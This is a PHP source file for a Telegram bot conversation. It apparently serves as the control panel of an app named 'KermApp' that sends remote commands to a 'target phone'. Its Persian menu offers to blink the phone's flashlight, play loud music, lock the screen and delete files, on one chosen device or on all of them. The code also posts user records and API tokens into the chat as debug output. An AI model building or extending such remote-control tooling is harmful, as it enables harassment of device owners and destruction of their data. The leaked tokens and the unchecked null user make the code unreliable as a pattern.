<?php

namespace App\Telegram\Conversations;

use App\Models\User;
use App\Services\KermAppService;
use Illuminate\Support\Facades\DB;
use SergiX44\Nutgram\Conversations\Conversation;
use SergiX44\Nutgram\Nutgram;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;
use Illuminate\Http\Client\RequestException;

class DispatchKermEventConversation extends Conversation
{
    public string $action;

    public function start(Nutgram $bot, string $action)
    {
        $this->action = $action;

        $descriptions = [
            'flasher'    => "🔦 **فلشر:**\nبا این دستور، چراغ قوه گوشی هدف به صورت چشمک‌زن روشن می‌شود.",
            'music'      => "🎵 **موزیکر:**\nیک موزیک با صدای بلند روی گوشی هدف پخش خواهد شد.",
            'screen_off' => "📱 **آفر:**\nصفحه نمایش گوشی هدف خاموش/قفل می‌شود.",
            'deleter'    => "🗑 **دیلیتر:**\nفایل‌های موقت یا مشخص شده در گوشی هدف حذف می‌شوند."
        ];

        $text = $descriptions[$this->action] ?? "عملیات انتخاب شده آماده ارسال است.";
        $text .= "\n\n👇 لطفاً دستگاه مورد نظر را برای اعمال این دستور انتخاب کنید:";

        $user = User::where('telegram_id', $bot->userId())->first();

        if (!$user || !$user->api_token) {
            $kermApp = app(KermAppService::class);
            $bot->sendMessage(json_encode($user));
            try {
                $response = $kermApp->registerOwner(
                    telegramId: $user->telegram_id ?? $bot->userId(),
                    username: $bot->user()?->username,
                    name: $bot->user()?->first_name
                );

                $bot->sendMessage(json_encode($response));
            } catch (RequestException $e) {
                logger()->error("Error registering owner in KermApp: " . $e->getMessage());
                $bot->sendMessage("❌ خطایی در ارتباط با سرور رخ داد. مجدداً تلاش کنید.");
                $this->end();
                return;
            }


            User::updateOrCreate(
                ['telegram_id' => $bot->userId()],
                [
                    'api_token' => $response['data']['api_token'],
                ]
            );
        }

        $devices = DB::table('kermapp_devices')->where('user_id', $user->id)->get();

        if ($devices->isEmpty()) {
            $bot->sendMessage("❌ هیچ دستگاهی برای شما ثبت نشده است.  ");
            $this->end();
            return;
        }

        $keyboard = InlineKeyboardMarkup::make();

        foreach ($devices as $device) {
            $deviceName = $device->model ?? "دستگاه نامشخص";
            $keyboard->addRow(
                InlineKeyboardButton::make(
                    text: "📱 " . $deviceName,
                    callback_data: 'select_device:' . $device->kermapp_device_id
                )
            );
        }

        $keyboard->addRow(
            InlineKeyboardButton::make('🌐 ارسال به همه دستگاه‌ها', callback_data: 'select_device:all')
        );

        $keyboard->addRow(
            InlineKeyboardButton::make('❌ انصراف', callback_data: 'cancel_action')
        );

        $bot->sendMessage($text, parse_mode: 'Markdown', reply_markup: $keyboard);

        $this->next('handleDeviceSelection');
    }


    public function handleDeviceSelection(Nutgram $bot, KermAppService $kermApp)
    {
        if (!$bot->isCallbackQuery()) {
            return;
        }

        $data = $bot->callbackQuery()->data;

        if ($data === 'cancel_action') {
            $bot->answerCallbackQuery('عملیات لغو شد.');
            $bot->deleteMessage($bot->chatId(), $bot->messageId());
            $this->end();
            return;
        }

        if (str_starts_with($data, 'select_device:')) {
            $bot->answerCallbackQuery();
            $deviceId = str_replace('select_device:', '', $data);

            $user = User::where('telegram_id', $bot->userId())->first();

            $targetDeviceId = $deviceId === 'all' ? null : (int) $deviceId;

            try {
                $kermApp->sendEvent(
                    apiToken: $user->api_token,
                    event: $this->action,
                    deviceId: $targetDeviceId
                );

                $bot->editMessageText(
                    "✅ دستور **{$this->action}** با موفقیت به دستگاه ارسال شد!",
                    parse_mode: 'Markdown',
                    chat_id: $bot->chatId(),
                    message_id: $bot->messageId()
                );
            } catch (RequestException $e) {
                $bot->sendMessage("❌ خطایی در ارتباط با سرور رخ داد. مجدداً تلاش کنید.");
            }

            $this->end();
        }
    }
}
